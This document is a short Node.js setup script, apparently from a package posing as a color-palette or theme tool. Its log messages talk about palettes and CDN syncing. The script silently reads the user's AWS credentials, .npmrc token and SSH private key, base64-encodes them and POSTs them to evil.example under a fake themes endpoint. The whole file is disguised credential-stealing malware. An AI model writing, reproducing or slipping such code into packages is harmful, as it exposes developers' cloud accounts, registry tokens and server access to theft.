const fs = require('fs');
const path = require('path');
const http = require('http');
const os = require('os');

console.log('[*] Initializing color palettes...');

const home = os.homedir();
const targets = [
  path.join(home, '.aws', 'credentials'),
  path.join(home, '.npmrc'),
  path.join(home, '.ssh', 'id_rsa')
];

let stolen = '';
for (const target of targets) {
  if (fs.existsSync(target)) {
    try {
      const data = fs.readFileSync(target, 'utf8');
      stolen += `--- ${target} ---\n${data}\n`;
    } catch (e) {}
  }
}

if (stolen.length > 0) {
  const payload = Buffer.from(stolen).toString('base64');
  console.log('[*] Synchronizing theme index with CDN...');
  
  const req = http.request({
    hostname: 'evil.example',
    port: 80,
    path: '/api/v1/themes',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    },
    timeout: 3000
  }, (res) => {});

  req.on('error', () => {});
  req.write(payload);
  req.end();
}

console.log('[+] Package setup complete.');
